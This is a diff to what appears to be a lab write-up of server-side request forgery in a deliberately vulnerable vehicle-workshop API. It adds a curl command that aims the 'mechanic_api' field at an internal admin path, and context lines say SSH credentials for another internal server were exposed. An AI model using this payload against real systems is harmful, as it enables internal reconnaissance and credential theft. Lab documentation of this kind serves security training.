@@ -31,7 +31,11 @@ curl -X POST  http://10.1.10.104/workshop/api/merchant/contact_mechanic -d '{"me
 
 that confirms that SSRF exists.
 - Accessing an internal resource 10.1.10.105/admin
-with more enumeration and directory indexing the attacker find admin directory on different internal server "10.1.10.105"
+with more enumeration and directory indexing the attacker find admin directory on different internal server `10.1.10.105`
+
+```python unfold ln:false unwrap title:"code"
+curl -X POST  http://10.1.10.104/workshop/api/merchant/contact_mechanic -d '{"mechanic_code":"TRAC_JHN","problem_details":"call me","vin":"8PK1LM7PB5YV9EEG0","mechanic_api":"http://10.1.10.105/admin","repeat_request_if_failed":false,"number_of_repeats":1}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
+```
 <img width="2497" height="295" alt="image" src="https://github.com/user-attachments/assets/a934fb41-bb54-4c59-ae63-503924c89ff1" />
 
 exposed SSH credentials for another internal server..
